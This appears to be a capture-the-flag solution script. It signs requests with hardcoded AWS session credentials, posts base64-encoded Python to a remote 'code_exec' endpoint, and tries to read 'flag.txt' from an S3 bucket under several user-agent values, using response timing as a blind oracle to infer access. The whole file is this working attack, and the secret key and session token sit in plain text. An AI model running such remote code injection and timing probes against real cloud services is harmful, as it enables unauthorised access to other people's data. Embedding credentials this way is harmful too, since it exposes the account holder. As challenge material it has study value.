import base64
import requests
import time
from aws_requests_auth.aws_auth import AWSRequestsAuth

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYINWI54QUF",
                       aws_secret_access_key="vzoDaHLWP97VayPQRZpwLhu9+wucg+FdyJbsgKBQ",
                       aws_token="IQoJb3JpZ2luX2VjELX//////////wEaDGlsLWNlbnRyYWwtMSJGMEQCICgyqloerkVTXTE5628Kp386BsQLYbXsQC4+rOu6I0INAiALeJaaL7isClSF+8qxnBZHA9Hk+WTg7zcTBxBBIzGtyiq1AggiEAAaDDEyMTc3NDA1Mjg4MCIM+Rpw/jafiBZf85MDKpICyLS9DUhUvWvbZ96LLt/M2kRPwKA2Cz68ISWVyBt/A7mKpJ0/E0HNdzCBZod2V2B2A+e2pm7A0yd/0pcb4t7MErEMgPBMoIzOywtMhleclfugWQqI52Do/aUoiR3cPNfBXutl/fYMykNSRZIkU+r1RywE1Yy3nbDy9zGpa2tfXU5plezMGPO15sxKYFz6PClI98LayWhEiEl89hTv5oAdzK+O3ONrp2TM8IyZf7G3eA3t9BP1Kl19E/NtsNZkQCYQwIbOMgRbAkQMvZCBKXilYo1GUVQvrGmeoyZq3LGOgj9o9bxa5jV+Kg4TSRTdL5R0yqeQrhiq3uJBh3ybX+8lnKs+auiOvaava6lGaGyL5KdwXzCu58vTBjqeARTzARMyhUPkGpGGVOScggiv11wG1cCI039vSFoWRPBrCt2Kt1K6+sJqTm4Jxbkg0A0ca6yLHbGxCkq6f3nrdRfuDiBVACtArW8jBjgxp+saXsdfHpS6xTaGTGk8kSE7PBtzeSYzug2gmQdMjL1+LlotY2UVvcIft1FSc8YxPWu62NeRcPyGJMkbHLS/6VJcRAhPg/Vnbx9m/gkhpvl7",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

url = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

def test_ua(ua):
    code = f"""
import time
import boto3
from botocore.config import Config
config = Config(user_agent='{ua}', connect_timeout=2, read_timeout=2, retries={{'max_attempts': 0}})
ak = 'ASIARYWSMSYINWI54QUF'
sk = 'vzoDaHLWP97VayPQRZpwLhu9+wucg+FdyJbsgKBQ'
tok = 'IQoJb3JpZ2luX2VjELX//////////wEaDGlsLWNlbnRyYWwtMSJGMEQCICgyqloerkVTXTE5628Kp386BsQLYbXsQC4+rOu6I0INAiALeJaaL7isClSF+8qxnBZHA9Hk+WTg7zcTBxBBIzGtyiq1AggiEAAaDDEyMTc3NDA1Mjg4MCIM+Rpw/jafiBZf85MDKpICyLS9DUhUvWvbZ96LLt/M2kRPwKA2Cz68ISWVyBt/A7mKpJ0/E0HNdzCBZod2V2B2A+e2pm7A0yd/0pcb4t7MErEMgPBMoIzOywtMhleclfugWQqI52Do/aUoiR3cPNfBXutl/fYMykNSRZIkU+r1RywE1Yy3nbDy9zGpa2tfXU5plezMGPO15sxKYFz6PClI98LayWhEiEl89hTv5oAdzK+O3ONrp2TM8IyZf7G3eA3t9BP1Kl19E/NtsNZkQCYQwIbOMgRbAkQMvZCBKXilYo1GUVQvrGmeoyZq3LGOgj9o9bxa5jV+Kg4TSRTdL5R0yqeQrhiq3uJBh3ybX+8lnKs+auiOvaava6lGaGyL5KdwXzCu58vTBjqeARTzARMyhUPkGpGGVOScggiv11wG1cCI039vSFoWRPBrCt2Kt1K6+sJqTm4Jxbkg0A0ca6yLHbGxCkq6f3nrdRfuDiBVACtArW8jBjgxp+saXsdfHpS6xTaGTGk8kSE7PBtzeSYzug2gmQdMjL1+LlotY2UVvcIft1FSc8YxPWu62NeRcPyGJMkbHLS/6VJcRAhPg/Vnbx9m/gkhpvl7'
session = boto3.Session(aws_access_key_id=ak, aws_secret_access_key=sk, aws_session_token=tok, region_name='us-east-1')
s3 = session.client('s3', config=config)
try:
    s3.get_object(Bucket='userd8a2f72fe43094e8', Key='flag.txt')
    time.sleep(2.5)
except Exception as e:
    ex_str = str(type(e))
    if 'AccessDenied' in ex_str:
        pass
    else:
        time.sleep(5.0)
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(url, json={"code": encoded_code}, auth=auth, timeout=10)
    except:
        pass
    elapsed = time.time() - start
    if elapsed > 4.5:
        return "Unknown Error (elapsed {:.1f})".format(elapsed)
    return elapsed > 2.0

for ua in ["REDACTED", "testing", ">>", "CloudFront"]:
    print(f"UA '{ua}': {test_ua(ua)}")
